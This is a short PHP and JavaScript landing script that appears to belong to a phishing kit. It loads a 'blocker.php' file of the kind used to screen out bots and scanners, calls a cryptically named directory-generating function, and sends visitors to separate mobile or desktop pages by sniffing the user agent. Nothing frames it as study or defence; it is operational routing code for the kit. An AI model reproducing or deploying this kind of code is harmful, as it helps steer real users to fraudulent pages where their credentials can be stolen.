<?php
date_default_timezone_set('GMT');
require "../../blocker.php";
require "functions/Mfunctions.php";
if (strlen(SERVER_GATEWAY()) !== 30) { @SgenRan(dirname(__DIR__));}
?>
       <html><head>
        <script type="text/javascript">
        var device = navigator.userAgent
        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
        {
        window.location = "./mobile.php";
        }
        else
        {
        var page = "./pc.php";         
        top.location = page;
        }
        </script>
        </head>
        </html>